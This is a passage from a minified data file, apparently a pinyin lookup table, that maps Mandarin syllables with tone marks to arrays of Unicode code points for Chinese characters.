3018,23298,25120,25191,25709,26893,27188,28116,28432,30452,31107,32119,32310,32832,32844,32887,33201,34777,36310,36399,36448,36497,36548,37342,39357],\"gāi\":[20357,22419,23007,23760,26192,30049,31092,33604,35442,35813,35941,36037,36044,36165,38484],\"lái\":[20358,20459,20488,23811,23821,24242,26469,26814,26870,28062,28150,29453,29724,31577,31618,33713,33802,36904,37106,37688,38140,39435,39904,40326,40627],\"kuǎ\":[20361,21685,22446,37529],\"gōng\":[20362,20844,21151,21265,21268,22632,23467,23470,24037,24138,24339,24685,25915,26459,30909,31996,31999,32945,35301,35317,36524,36531,39672,40852,40858],\"lì\":[20363,20432,20458,20616,20782,20791,20947,21033,21147,21169,21237,21382,21385,21412,21423,21426,21459,21519,21590,21774,21811,22182,22215,22364,22619,22754,23091,23151,23668,23718,24743,24759,24900,25150,25646,26278,26310,26334,26424,26533,26627,26647,26651,27306,27348,27370,27408,27508,27511,27813,27828,28054,28327,28671,28701,29199,29345,29441,29653,29806,29893,29905,29925,30124,30178,30311,30445,30553,30725,30778,30782,30975,31018,31019,31024,31154,31197,31435,31520,31717,31890,31901,31986,33079,33480,33560,33620,33669,33673,33946,33950,34294,34488,34510,34528,34599,34679,34823,34851,35400,35720,36210,36706,36707,36729,37192,37469,38582,38583,38643,38722,38731,39681,40168,40215,40389,40604],\"yīn\":[20364,20944,21905,22142,22233,22240,22420,22553,23035,23139,24852,24903,26678,27684,27911,28341,28646,30230,31115,31221,31555,32106,32248,33589,33937,34093,35008,35570,37542,38111,38345,38437,38452,38512,38523,38530,38674,38688,38791,38899,38910,39408,39555,40791],\"mǐ\":[20366,23370,24365,25929,27939,28211,28758,31859,31886,32651,33042,33416,33886,34077,37540],\"zhū\":[20367,26666,27104,27237,27367,27371,27929,28532,28710,29482,29664,30787,31228,32081,33585,34127,34523,34667,34857,35006,35461,35576,35803,35832,35948,36326,37054,37526,38114,39407,39842,39930,40248,40708],\"ān\":[20370,20579,23189,23433,23766,24245,26697,27688,30438,30443,33124,33780,33851,33866,34029,35485,35571,35865,38796,38797,38909,39331,39839,40298,40341,40524],\"lù\":[20371,20679,21198,21216,22309,22388,22646,23101,23757,24280,24404,24405,25134,25693,26882,27162,28117,28133,28172,28425,28510,29741,29840,29994,30429,30569,30793,31103,31108,31249,31307,31635,31759,31788,31797,31798,31833,31926,34061,34135,34370,34736,36034,36162,36258,36335,36379,36439,36613,36678,36738,36760,36911,37249,37636,37682,37684,37876,38520,39428,39484,39909,40252,40294,40305,40442,40557,40575,40595],\"móu\":[20372,21178,24648,30520,34513,35584,35851,36366,37738,40254,40624],\"ér\":[20373,20799,20816,20818,23759,26669,27919,31915,32780,33017,33611,35003,36608,36700,38481,38573,39669,39838,40085,40239,40504],\"dòng tǒng tóng\":[20375],\"chà\":[20376,22908,23033,23700,27722,35435,35815],\"chì\":[20377,20666,21189,21201,21489,21883,24435,24668,24919,24975,25048,25270,25941,26021,26456,28225,28795,28861,28926,29118,30163,30200,30235,32708,32709,32740,32744,33119,36196,36265,36971,37459,38644,39149,39276,40338,40408],\"gòng gōng\":[20379,20849],\"zhōu\":[20380,21608,21900,24030,24479,27954,28109,28863,28880,29656,30698,33311,35589,35704,35788,36057,36178,36616,36630,36736,36913,37102,37506,38668,39410,39430,40259,40508],\"rú\":[20382,20754,22149,22914,23340,23418,24100,26328,26695,28202,28641,31566,33593,34144,34231,34657,34837,35005,35174,37018,37305,37539,38135,39020,39077,40044,40209,40253],\"jiàn cún\":[20383],\"xiá\":[20384,20448,21283,23777,23805,25966,26247,26585,28832,28890,29390,29421,29433,29672,29781,30806,30820,30892,31083,31594,32278,32712,33309,33338,34168,36206,36676,36758,36944,37724,37771,38492,38527,38686,39458,39803,40375,40672],\"lǚ\":[20387,20406,20770,21525,21570,23649,23650,23653,25364,25435,26053,26784,28946,31075,31238,31341,32125,32311,32533,33154,33168,35099,35128,37080,37569,38109],ta:[20388],\"jiǎo yáo\":[20389,20709,24506],\"zhēn\":[20390,20597,23498,24103,24106,24128,25656,26015,26722,26984,27035,27196,27549,27976,28254,28519,28597,29513,29645,29646,29799,29956,30494,30495,30759,30890,31087,31118,31131,31668,32983,33275,33908,33942,33985,34237,35998,36126,36675,36937,37209,37341,37441,37681,37756,38024,40053],\"cè zè zhāi\":[20391,20596],\"kuài\":[20393,20744,20983,21721,22130,22310,22359,22602,24028,24293,24555,26077,27443,29423,29546,31607,31977,33037,33214,37072,37174,40032,40089],\"chái\":[20394,20757,21901,26612,29362,31073,35962],\"nóng\":[20396,20738,20892,21725,22117,27266,27393,27987,28611,29174,31151,31230,31328,33043,33215,34173,35163,35688,36786,36787,37298,39710],\"jǐn\":[20397,20760,21370,21418,24057,27135,28428,29822,32039,32202,33771,34035,35641,35880,37670,38182,39241,39313],\"hóu hòu\":[20399,30694],\"jiǒng\":[20400,20690,20879,22247,27842,28547,28847,28913,29018,29019,29106,29147,31384,32151,35111,36837,36872,38984,39054],\"chěng tǐng\":[20401],\"zhèn zhēn\":[20402,25557],\"zuò\":[20403,20570,21777,22352,23709,23710,24231,31066,31987,32985,33859,33860,34009,34959,38460],\"qīn\":[20405,20819,23175,23898,23956,27453,34942,35483,38054,38985,39416,39566,39868],\"jú\":[20407,21881,23109,23616,24008,26888,27224,27878,28119,28264,28951,29329,29386,31927,33738,34332,36252,36348,36459,36610,37113,38320,39414,39527,40281,40308,40362,40752,40755],\"shù dōu\":[20408],\"tǐng\":[20409,22306,23063,25402,28047,28918,29693,33057,33351,35476,38962,39051],\"shèn\":[20410,24892,24910,26138,28033,28183,28402,30214,30254,30488,31091,32958,32962,33060,33102,34563,34564,37600],\"tuì tuó\":[20411],\"nán\":[20413,21891,23066,25257,26260,26511,26591,26976,30007,30040,33710,33843,36950],\"xiāo\":[20414,21715,22069,22203,22210,23115,23471,23477,24232,24391,25585,26541,26549,26783,27385,27466,27594,28040,28487,28703,28785,28786,28875,28935,29447,29538,30170,30175,30813,30819,31385,31659,31768,31787,32131,32481,32731,33198,33831,34157,34376,34387,34754,34767,34800,34856,36355,36877,37559,38144,38660,39093,39501,39553,39623,39632,39752,40222,40245,40397,40494],\"biàn pián\":[20415,32246,32527],\"tuǐ\":[20416,33151,36422,39613],\"xì\":[20418,21304,21324,21612,22669,23619,23635,23661,24549,24620,24644,26910,28509,28511,28569,29058,29332,30966,31114,32048,32140,32280,32454,32484,33283,33284,34158,34409,34891,35236,36201,36231,37092,37363,38411,38553,38559,38716,39228,39273,39721,40662],\"cù\":[20419,23208,25009,29469,30212,30255,31751,32300,33064,34079,35470,36247,36391,36415,36441,36468,36469,37259,39011,40704],\"é\":[20420,22254,23077,23753,23784,23785,28048,29684,30354,30539,30912,33706,35355,35472,35660,35769,36823,37387,37608,38151,38943,38989,39069,39780,40285,40286,40517],\"qiú\":[20421,21492,21778,22234,23863,24047,24048,25167,26754,27535,27628,27714,27731,27845,27991,28269,29034,29360,29580,29699,29830,30387,30426,32012,32127,32909,33409,33677,34412,34415,34551,35032,35283,35305,35332,35333,36053,36167,36878,36881,36946,37195,37338,37371,37558,38916,39810,39876,39997,40765],\"xú\":[20422,24464,31121],\"guàng kuāng\":[20423],\"kù\":[20424,21950,22195,24211,24235,24292,30228,32093,32468,34996,35044,35122,37239],\"wù\":[20425,21153,21209,21247,21372,22366,22626,22886,23162,23524,23676,23689,23912,24546,24734,24735,24750,25098,25188,26212,26444,28329,28944,29059,29289,30182,30713,31417,31877,34305,35492,35823,37576,38434,38550,38654,38682,38695,38768,39446,39579,40361,40540,40767,40768],\"jùn\":[20426,20737,21569,22472,23535,23803,25039,25411,25887,26201,26846,29127,29690,30063,31459,31647,34592,36048,37089,38486,39189,39298,39423,39567,40276,40277,40280],\"liáng\":[20429,22682,26753,26891,27153,31918,31921,31975,33391,36652,36748],\"zǔ\":[20430,21800,29244,31062,32068,32452,35419,35781,37818,38459,38779],\"qiào xiào\":[20431],\"yǒng\":[20433,21191,21192,21647,22471,22606,23921,24430,24634,24703,24704,24805,24849,24889,24898,26593,26640,27704,27891,28263,29996,34553,35424,36362,36404,39890,40108],\"hùn\":[20434,20529,22274,23585,24897,25485,28343,28957,30580,35304,35554,35816],\"jìng\":[20435,20665,22659,22924,23129,23143,24362,24371,24452,24465,25964,26324,26737,26807,27972,28702,29517,30153,30169,31454,31455,31467,31478,31480,33003,33051,33686,35497,36353,36851,36885,37857,38236,38742,38745,38748,40283],\"sàn\":[20437,38288],\"pěi\":[20438],\"sú\":[20439],\"xī\":[20441,20694,20846,20958,21349,21376,21560,21775,21821,22075,22095,22193,22805,22874,23302,23305,23638,23904,24007,24076,24454,24495,24687,24713,24725,24769,24796,26132,26206,26224,26227,26342,26512,26744,27069,27176,27200,27447,27685,27728,28e3,28101,28179,28330,28911,28929,28936,28959,29060,29064,29081,29113,29114,29115,29160,29204,29306,29312,29344,29351,29707,30236,30361,30542,30630,30717,30802,30926,30978,31232,31352,31416,31902,31974,32198,32357,32690,32725,32726,32952,32953,33181,33342,33667,33765,33952,34597,34693,34763,34869,35199,35321,35325,35327,35654,35903,35904,35944,35951,35989,36197,37020,37134,37189,37295,37368,37675,37869,37898,38004,38177,38581,39183,39246,39291,39889,40279,40450,40759],\"lǐ\":[20442,23052,23778,23794,26446,27418,28012,28583,29702,31036,31150,31924,35023,35041,35914,36902,37008,37300,37616,38146,39881,40039,40049,40100,40162],\"bǎo\":[20445,22562,23212,23453,23514,23539,23542,29668,32229,33862,34293,35091,36082,38732,39161,39165,39281,39362,40181,40199,40488],\"yú shù yù\":[20446],\"sì qí\":[20447],\"xìn shēn\":[20449],\"xiū\":[20450,20462,21691,24229,27143,28876,32670,33049,33065,33273,35973,37533,37760,39117,39240,39312,39652,39673,39860,40003,40258,40506],\"dì\":[20452,20569,20672,22474,22673,22700,23075,24093,24607,26099,26762,28941,29587,29963,30513,30535,30898,31094,31128,31532,32224,32532,33123,33730,33922,34069,34627,34669,34734,35558,35867,36406,36882,36883,36958,36976,37482],\"chóu\":[20454,20756,23334,24774,24833,25060,26662,29181,30068,30087,30359,31264,31609,31820,32082,32162,32504,33751,35446,35726,35728,36364,36490,37223,37228,37307,38612,38624,38630],\"zhì\":[20455,20587,20776,21046,21141,22401,23073,23512,24089,24092,24159,24226,24228,24268,24408,24463,24477,24535,24558,25061,25067,25347,25370,25527,25711,25842,26072,26186,26234,26633,26702,26813,27341,27355,27835,27959,28365,28382,28399,28492,28676,28825,29099,29438,29464,29839,29894,30164,30179,31017,31057,31209,31223,31258,31290,31305,31378,32041,32251,32622,32720,33187,33267,33268,33430,34541,34975,34976,35069,35231,35287,35311,35318,35468,35921,35922,36013,36074,36100,36136,36157,36337,36396,36499,36618,36734,37061,37517,37589,37973,38106,38183,38495,38578,38601,39396,39469,39482,39495,39576,39919,40217,40409,40503],\"liǎ liǎng\":[20457],\"jiǎn\":[20461,20537,20745,20943,21098,22591,24383,24389,25129,25132,25315,25400,25441,25536,25791,26535,26604,26776,26816,26908,27298,28187,28245,28733,29776,30545,30652,30839,30897,30982,31509,31591,31616,31777,32120,32365,32742,33575,34246,34834,35045,35143,35145,35194,35395,35591,35629,35710,35883,36284,36423,37911,39691,39950,40568,40571,40572],\"huò\":[20464,21663,22191,22207,22895,24416,24785,25110,25837,26084,26340,27316,27790,28273,28694,29554,30312,30483,30672,31096,31117,31339,31394,32815,33243,33383,33719,33958,34303,34838,35595,36008,36135,37699,37962,38252,38616,38669,38723,38852],\"jù jū\":[20465,25454,37624,38191],\"xiào\":[20466,20634,21177,21682,21742,21880,22027,22056,22063,23389,25928,25989,25990,27479,28045,29117,31505,35432,35487],\"pái\":[20467,24472,29260,29348,29445,31792,31794,36651],\"biào\":[20469,39998,40148],\"chù tì\":[20470],\"fèi\":[20471,21077,21406,21536,23645,24223,24259,24290,26162,26314,27360,27832,28663,29394,30280,32954,33801,36027,36153,37928,38212,38507,38725,40739],\"fèng\":[20472,20964,22857,28247,28968,29e3,36085,36183,40175,40179,40204],\"ǎn\":[20474,21813,22511,25566,32623,37544,38133],\"bèi\":[20475,20493,20573,20601,20633,20675,22791,24726,24811,24834,24970,26113,26774,28953,29292,29333,29384,29437,29692,29746,30874,31129,31954,33501,34003,34557,35097,35997,36125,36592,36649,36744,37046,37093,37121,37575,37950,38049,38785,38836],\"yù\":[20476,20773,21893,21929,21947,22495,22537,22954,23255,23507,23786,23950,24253,24423,24481,24840,24958,25131,26161,26843,26844,26859,27378,27406,27421,27442,27603,28020,28143,28394,28495,28582,28778,28980,29020,29135,29152,29225,29425,29508,29577,29721,30217,30290,30753,30818,30834,30983,30998,31004,31142,31191,31266,31286,31741,31838,31858,31894,32206,32621,32895,32896,33352,33419,33420,33567,33966,34019,34041,34167,34316,34591,34606,34988,35029,35465,35565,35709,35861,35947,36553,36621,36915,36935,36985,37057,37287,37434,37578,37669,37933,38064,38334,38408,38628,38705,38928,39044,39147,39239,39275,39341,39496,39533,39728,39729,39739,39754,40010,40191,40229,40231,40234,40274,40440,40466,40518,40556],\"xīn\":[20477,22138,22945,23324,24286,24515,24516,24571,24798,26032,26133,26490,27427,27462,28824,30458,34218,35362,36763,37028,37386,37573,37995,38156,39336,39339],\"hǔ chí\":[20479],\"jiù\":[20483,20710,21267,21275,21302,21417,21646,23601,24260,24271,24272,24934,25412,25937,26087,26601,26622,26709,27405,27559,30106,33276,33285,33290,39910,40434,40555,40596,40808],\"yáo\":[20484,20636,21954,22426,22575,23002,23217,23591,23597,23779,23970,23972,24493,25594,25622,25671,25727,26266,27043,28391,28881,29243,29498,29671,29796,29814,30936,31377,31407,31408,32948,34344,35616,35617,35875,36602,36730,36953,36965,37006,39012,39099,39126,39174,39194,39977,40025,40144],\"cuì zú\":[20485],\"liǎng liǎ\":[20486],\"wǎn\":[20487,21773,23113,24779,25405,26202,26213,26217,26236,26778,26880,29740,30073,30358,30412,30871,32169,32176,32510,33048,33814,36384,36627,37588],\"zǒng\":[20490,20588,20655,23928,24635,24803,25460,25603,25696,29162,32207,32235,32258,32317,34007],\"guān\":[20492,20851,23448,26874,30237,30287,31396,33924,38306,38359,38364,39973,40030,40143],\"tiǎn\":[20494,21818,24541,24767,26218,27524,28127,30547,33094,33300,35237,35277,36063,37674,39170],\"mén\":[20497,25194,25451,29834,33755,34379,37702,38036,38272,38277,38376],\"dǎo dào\":[20498],\"tán tàn\":[20499,22510],\"juè jué\":[20500],\"chuí\":[20501,22402,22464,25462,25637,26712,26864,27084,31648,33092,33753,37656,37786,38180,38514,38976],\"xìng\":[20502,22995,23134,23353,24184,24615,24763,26447,28076,32200,33238,33607,33685,33877],\"péng\":[20503,20656,22620,22643,24376,24969,25408,26379,26842,26902,27173,30844,31261,31484,31735,32388,33192,33411,34028,34325,34778,34779,34998,36643,37643,37981,38904,38908,39471,39676,39685,39700,40300,40527],\"tǎng cháng\":[20504],\"hòu\":[20505,21402,21518,22421,22560,24460,27913,33577,35934,36869,37064,39836,40031,40078,40088],\"tì\":[20508,21059,22159,22164,23625,23644,24716,24720,24789,24790,25147,25510,26367,26385,27474,27554,28053,29899,31545,31818,34201,35077,36886,36919,39664,39680,39684],\"gàn\":[20509,20942,24185,27046,27274,28134,28776,30448,32058,32448,35404,36113,36195,39597],\"liàng jìng\":[20510,38739],\"suī\":[20512,21752,22794,28374,28617,30509,30562,33429,33661,33662,34429,38614,38806],\"chàng chāng\":[20513],\"jié\":[20514,20604,20625,21030,21031,21052,21163,21180,21353,21354,23125,23211,23377,23690,23848,23909,23995,24e3,24175,25130,25463,25526,25838,26117,26466,26480,26688,26717,26988,26998,27044,27905,28368,28500,29412,30571,30989,31469,31680,32687,33709,34037,34531,34576,34840,34846,34877,34929,35002,35344,35440,35505,35750,36373,36860,37475,37755,38268,38945,39834,40082],\"kǒng kōng\":[20517],\"juàn\":[20518,21173,22854,24955,26698,28099,29431,29543,30519,30538,30560,32109,32121,32482,32613,32642,33091,34088,37124,39179],\"zōng\":[20519,22571,23447,23887,23893,24830,26401,26837,26934,29095,29475,30955,32195,32746,33113,33916,34668,35957,36392,36394,36452,37712,37953,39436,39459,39572,39683,39689,39735,39918,39932],\"ní\":[20522,22381,22527,23612,23636,24617,28131,29450,31870,32867,34477,34618,35308,35982,36316,36631,37107,37422,38092,38675,39324,39906,40117,40593,40815],\"zhuō\":[20524,25305,25417,26700,26802,26817,26867,27093,28095,31399,37935],\"wō wēi\":[20525],\"luǒ\":[20526,21062,26346,30256,30323,33245,33999,34819,35064,36534],\"sōng\":[20527,20935,23040,23847,23913,24250,25021,26494,26496,26537,26583,26789,27303,28126,28621,30841,33752,39686],\"lèng\":[20528,22542,24867,30550,36380],\"zì\":[20531,21082,23383,24675,28173,28460,29304,30501,30502,32980,33022,33258,33569,33634],\"bèn\":[20532,22348,25465,25770,28160,31528,36905],\"cǎi\":[20536,21835,23111,24425,25505,26828,27613,30572,32181,36340,36393],\"zhài\":[20538,20661,23528,30261,30758],\"yē\":[20539,21524,22094,25832,26253,26928,27467,28529,34862],\"shà\":[20541,21820,21922,27459,31633,32732,32739,33808,38319,38670],\"qīng\":[20542,20670,21375,22282,23496,27682,27691,28152,28165,34619,36605,36629,36731,37100,37638,37963,38737,38738,39894],\"yīng\":[20544,22052,22111,22198,23156,23190,23240,23344,23366,23422,24869,25732,25878,26400,26716,27185,27387,28214,29008,29681,29787,29838,29908,29959,29974,30884,31023,32211,32403,32492,32552,32578,32579,32588,33210,33521,33722,34337,34663,34867,35118,35707,36047,36552,37965,38195,38681,38906,40236,40337,40359,40367,40426,40441,40462,40474,40550,40560],\"chēng chèn\":[20545,29231],\"ruǎn\":[20548,26378,29772,29888,30877,31005,33117,36575,36653,36719,38446],\"zhòng tóng\":[20549],\"chǔn\":[20550,24823,30582,33846,34850,36080],\"jiǎ jià\":[20551],\"jì jié\":[20552],\"bǐng bìng\":[20555],\"ruò\":[20556,21458,23926,24369,26953,28971,29191,31660,31707,33979,37120,39961,39983,40376],\"tí\":[20557,21399,21884,21953,23865,28477,29765,30588,31157,31242,32249,32519,32612,34139,35078,35605,36263,36420,36431,37261,37719,38988,39064,39456,39863,39927,40128,40284,40420,40520],\"wēi\":[20558,21361,21940,23041,23193,23990,24013,24494,24836,25547,25595,26931,26994,28326,28883,29032,29168,30291,32261,33896,33907,34183,34610,34651,35235,35444,36918,38535,38536,38714,39939,39940,40130],\"piān\":[20559,22248,23205,26948,29327,31687,32745,37698],\"yàn\":[20560,21388,21421,21761,21933,22152,22181,22576,22943,23026,23306,23359,23476,24421,24422,25957,26191,26277,26325,26339,28383,28750,28756,28775,28777,28948,28976,28977,29078,29124,29290,29458,30746,30831,33395,33398,33399,35214,35267,35326,35578,35724,35742,35866,35891,35923,35924,36107,36119,36189,36549,37184,37245,37308,37317,38593,39181,39260,39440,39443,39476,39511,39520,39564,39731,40171,40200,40243,40387,40432,40798],\"tǎng dàng\":[20562],\"è\":[20564,21262,21374,21380,21597,21666,22121,22441,22538,22574,23691,23871,24261,24746,24853,25145,25212,25636,25657,25820,27374,27486,27514,28226,29735,30728,30736,30790,33133,33482,33852,34138,34437,34625,35240,35556,35725,35860,35935,36571,36598,36717,36940,36943,36987,37122,37418,37716,37993,38199,38440,38456,38942,38990,39066,39187,39209,39295,39952,39978,40055,40132,40346,40535,40771,40822],\"xié\":[20565,21232,21327,21332,21963,22437,22858,24650,24886,25337,25658,25783,25813,25847,25884,26012,26090,29057,29170,32138,32243,32256,32556,32723,32961,33029,33031,33035,33166,34658,34938,35181,35559,35735,35856,38795,38837,40868],\"chě\":[20566,25199,25766],\"shěng\":[20567,28219,30490],\"chā\":[20571,21967,25184,25407,25554,25591,30080,33279,33366,37535,37732,38200,39223],\"huáng\":[20575,20976,21924,22573,22708,23187,23858,24488,24822,27003,28255,29004,29530,29789,29852,30272,30343,30970,31316,31681,31783,33358,33887,34647,34789,35579,36266,36945,37728,37892,38205,38541,38905,39213,39452,39945,40017,40135,40428,40643,40644],\"yǎo\":[20576,21676,23161,23438,23686,26483,26620,27034,28308,29397,31365,31368,33280,33517,38340,39445,40405,40809],\"chǒu qiào\":[20578],\"yóu\":[20580,23588,24238,24611,27787,27833,27999,28216,29369,29494,29495,30001,30115,31198,32940,33692,33720,34133,34480,34659,35367,36623,36662,36912,36938,37038,37109,37438,38080,39360,39799,39819,40063,40073],\"xū\":[20582,22687,23213,23299,26952,27432,27476,29176,30110,30449,32135,32259,32379,32997,34150,34391,34394,34395,34641,35015,35343,35377,35549,35651,35870,37968,38656,38920,39035,39036,39497,39706,39750,39766],\"zhā\":[20583,21747,25263,25363,25592,25699,27165,28195,30390,35312,35655,40772,40775],\"cī\":[20584,30133,34816,36224,39604,39626,40825],\"bī\":[20586,23620,26949,27636,35917,36924,39951,40126,40278],\"xún\":[20593,22106,23547,23563,23755,24033,24309,24490,24642,25559,25907,26092,26442,26642,26730,27187,27957,27988,28527,29125,29142,29667,29845,30019,32003,33600,34803,35426,35810,37161,40015,40024,40095],\"cāi sī\":[20594],\"duān\":[20595,23183,31471,35085,37748],\"ǒu\":[20598,21528,22036,32806,33122,34117,34261],\"tōu\":[20599,20600,37742],\"zán zá zǎ\":[20602],\"lǚ lóu\":[20603,20674],\"fèn\":[20606,20712,22859,22894,24325,24575,24868,24996,28725,30611,31182,31914,31966,33209,40029,40124],\"kuǐ guī\":[20608],\"sǒu\":[20609,21468,21471,22014,27362,30605,34222,34282],\"zhì sī tí\":[20610],\"sù\":[20611,20723,21961,22608,22609,22809,23242,24875,24991,27041,27150,27157,27536,27869,28049,28335,28344,28506,28517,29578,29663,29851,31756,31899,31903,32032,32292,32899,32901,33158,34060,34263,35307,35380,35606,35785,35873,36250,36444,36895,36961,36972,37577,39191,39500,39573,40016,40427,40532],\"xiā\":[20612,28998,30606,35898,39084,39957],\"yuàn yuán\":[20614,23195],\"rǒng\":[20615,20887,23426,27652,36597],\"nù\":[20617,24594],\"yùn\":[20618,23381,24701,24818,24864,24909,26527,33130,34164,34176,34292,34314,35102,35999,36816,36939,37075,37126,37213,37270,37278,38871,38878,38901,38907,39211],\"gòu jiǎng\":[20619],\"mà\":[20620,22044,27050,30576,31043,31137,32629,38273,39393,39554,39701],\"bàng\":[20621,22621,26834,29604,31254,33365,33953,34607,35607,35876,37770,38225],\"diān\":[20622,21415,23918,24005,24019,24020,25474,25895,25921,27079,28359,30315,30322,36430,39002,39003,39072,40827],\"táng\":[20623,21776,21882,22371,22530,22616,25642,26848,27062,28303,28447,29051,29805,30916,31135,31702,31939,31958,31963,33157,33179,33998,34711,34739,36207,36412,37132,37283,37781,38554,39225,39236,40374],\"hào\":[20624,21728,24655,26122,26150,26215,26272,26276,26285,26317,28009,28111,28564,28751,28765,30355,30364,30366,30369,30373,32791,32853,34179,34399,37143,39013,39074,39965],\"xī xì\":[20626],\"shān\":[20627,21024,21034,21116,22328,23665,25403,25639,26613,27270,28536,28568,29053,29414,29642,31512,32319,32692,32694,33056,33314,33439,34923,36314,36565,37014,38282,39877],\"qiàn jiān\":[20628],\"què jué\":[20629,22470],\"cāng chen\":[20630],\"róng\":[20635,23222,23238,23339,23481,23797,23896,23992,25102,25608,26343,26628,27029,27054,27061,27623,28342,28700,28927,29076,29416,29794,31297,32104,32466,32674,32924,33561,33592,33635,33993,34686,34701,34702,34833,35107,37780,38229,39397],\"tà tàn\":[20637],\"suō\":[20638,21766,21965,21990,23057,25677,26731,26797,30531,31761,31764,32679,33679,34001,36246,39867],\"dǎi\":[20643,27513],\"zài\":[20644,20750,20877,22312,25175,27909,36617,37224],\"gǔ\":[20646,21476,21842,23603,24882,27030,27070,27753,28104,28658,28692,29295,30391,30396,30444,30653,31296,32607,32662,32929,33077,33228,34211,34506,34865,35393,35778,36674,36903,37431,38068,39222,39305,40723,40724],\"bīn\":[20647,23486,24428,25996,26901,28392,28626,28657,28661,28693,32381,32548,34408,35945,35955,36051,36052,37024,37964,38228,38694,39022],\"chǔ\":[20648,20786,26485,26904,26970,26990,27290,28619,29876,30784,30990,31111,34389,40813,40828],\"nuó\":[20649,20794,25386,26779,27232],\"cān càn\":[20650],\"lěi\":[20651,20769,21437,22418,22593,22744,22760,27344,28741,30295,30667,30922,31016,32786,34124,34174,34271,34365,34845,35460,35716,35796,38008,40467],\"cuī\":[20652,20951,22676,23828,23903,24923,25703,27057,29525,30954,37849],\"yōng\":[20653,21960,22665,22725,23262,24248,24305,24949,25317,25793,28413,28745,29253,30152,30293,30320,33219,37013,37114,37144,37854,38235,38605,38621,39252,40005,40153,40411],\"zāo cáo\":[20654],\"sǒng\":[20657,23927,24578,24730,24879,24939,31462,32824,32883,39415],\"ào\":[20658,22387,22407,22714,22881,23279,23705,23728,23988,25034,25817,28595,37834,39489,39580],\"qī còu\":[20662],\"chuǎng\":[20664,30946,38358,38383],\"shǎ\":[20667,20749],\"hàn\":[20668,22462,24717,25022,25182,25421,25750,25788,26097,26200,26293,27721,28038,28450,28698,28938,29442,30356,30533,32752,33695,33761,34559,34605,34706,35648,36634,37356,37554,37582,38615,38967,38980,39060,39419,40382],\"zhāng\":[20669,23260,24352,24373,24432,24926,26290,27167,28467,29520,29835,31456,31931,34049,34769,36967,37155,37873,39206,39487,40006,40606],\"yān yàn\":[20671,22677,23342],\"piào biāo\":[20676,39584],\"liàn\":[20678,22556,23201,24651,25088,26973,27539,27566,28229,28491,28592,28722,28860,29001,29779,32244,32414,32451,33840,37676,37706,37832,38142,39946],\"màn\":[20680,22657,24148,24930,26364,28459,28599,29107,29516,32309,32550,34052,34352,37156,37853,38232],\"tàn tǎn\":[20683],\"yíng\":[20684,21942,22603,23348,25869,27001,27391,28289,28299,28386,28486,28633,28634,28660,28677,28699,28704,28719,28752,28764,29074,29151,29801,30401,30408,31132,31837,31855,32264,33556,33639,33721,33828,33829,33830,33854,34021,34240,34509,34631,34687,34722,34821,35597,36111,36194,36814,37795],\"dòng\":[20685,20923,20941,21160,21205,23003,25113,25359,26635,26847,28265,30800,33e3,33012,33110,36853,38680,39399],\"zhuàn\":[20686,21869,22208,22559,25776,28791,29777,31686,33118,33923,35144,35668,39244,39316],\"xiàng\":[20687,21224,21521,22190,23008,23953,26319,27233,29670,32575,34771,34902,35152,35937,37900,38917,39033,40012],\"shàn\":[20688,21892,22688,22689,23319,25797,25982,26923,27199,27482,27733,28759,30109,30960,32341,32558,33203,34798,34810,35349,35590,35697,35754,36109,36193,36216,37167,37925,39245,39480,39583,40019,40020,40157],\"tuí tuǐ\":[20691],\"zǔn\":[20692,22082,25753,35664],\"pú\":[20693,21261,22308,22691,28654,29531,29854,30632,31321,33670,33744,33769,33889,33969,33970,36108,37242,37879,38244],\"láo\":[20695,21171,21172,21214,21744,23810,23959,24997,26405,28022,29282,30184,30278,31362,31785,37290,37906,38137,39007,39645],\"chǎng\":[20696,21424,24288,25950,26166,27653,37625],\"guāng\":[20697,20809,21667,22425,23023,27960,28782,28823,28826,28827,28897,29654,33009,33578,36612,37543,40646],\"liáo\":[20698,22073,23293,23525,23534,23582,23658,23930,23962,23963,24299,24960,25977,26296,27217,29536,29849,30103,30274,31426,31773,32346,32557,32842,33163,33195,34260,34783,35906,36095,36440,36797,36988,39113,39630,40431,40553],\"dèng\":[20700,20979,22705,23965,27336,30634,30964,35252,37011,37159,38565],\"chán zhàn zhuàn\":[20701],\"bō\":[20704,23955,25320,25765,25773,27874,28298,29627,30326,30411,30773,30854,31009,32573,33760,34992,36467,37474,38069,39185,39293,39499,40013],\"huì\":[20705,21295,21321,21913,22034,22166,22298,23314,23533,23670,23671,24407,24409,24410,24507,24666,24693,24800,24935,24979,25075,26214,26291,27109,27230,27269,27352,27719,27851,28377,28499,28905,29172,29545,29860,30650,30794,31229,31330,31730,32117,32362,32472,32729,32765,33631,34087,34137,34184,34185,34794,35439,35496,35569,35667,35711,35763,35826,36036,36159,37932,38368,38419,38759,38958,39018,39058,39215],\"chuǎn\":[20706,21912,33307,33608,36403],\"tiě jiàn\":[20707],\"sēng\":[20711,39705],\"xiàn\":[20713,20724,21743,22455,22634,23021,23050,23466,23704,23796,25010,25738,26203,27212,27258,28032,28695,29486,29563,29616,29694,30476,30541,31919,31982,32100,32171,32218,32447,32528,32673,32680,33146,33236,33277,33483,33703,35490,35919,37607,37646,38480,38501,38519,38704,39201,39301,40626,40760],\"yù jú\":[20714],\"è wū\":[20715],\"tóng zhuàng\":[20718],\"lǐn\":[20719,20955,20956,24297,24298,25037,25044,25755,27265,27305,28575,30299,30301],\"gù\":[20721,20933,22266,22540,23827,23854,25925,26767,26845,29311,30204,31099,37678,38178,38599,39015,39038,39901,40116],\"jiāng\":[20725,22723,23004,27263,27565,27743,30037,30085,30995,32366,32560,32734,33587,33857,34193,34688,34751,35911,38849,40002,40137],\"mǐn\":[20726,20922,21025,21188,24751,24829,24845,24924,25003,25279,25923,25935,25967,27887,28515,30399,31522,31549,31778,34848,38292,38313,38389,38397,39989,40152,40701],\"jìn\":[20728,20954,22116,22157,22672,22743,22935,23335,25634,26185,26187,26499,27555,27989,28024,28301,28613,28636,28908,29025,29180,29710,29800,29878,30433,31090,32265,32537,33641,34254,35250,35280,36078,36112,36166,36817,36827,36914,38771,40829],\"jià jie\":[20729],\"qiào\":[20730,23789,24105,25772,27579,31373,31429,35482,35822,36488,38487,38825,38866,39642],\"pì\":[20731,23218,23251,23617,28604,29971,30088,35692,38370,40447,40458],\"sài\":[20735,31802,36093,36187],\"chán tǎn shàn\":[20739],\"dāng dàng\":[20741,24403,38371],\"xuān\":[20743,21927,22599,23191,23459,24835,24843,25550,26125,26244,29002,29014,29764,30587,30670,31140,31662,32743,32766,33841,33842,34002,34175,34300,34320,34646,34825,35552,35580,35678,35862,36562,36713,37753,39421,39962],\"dān 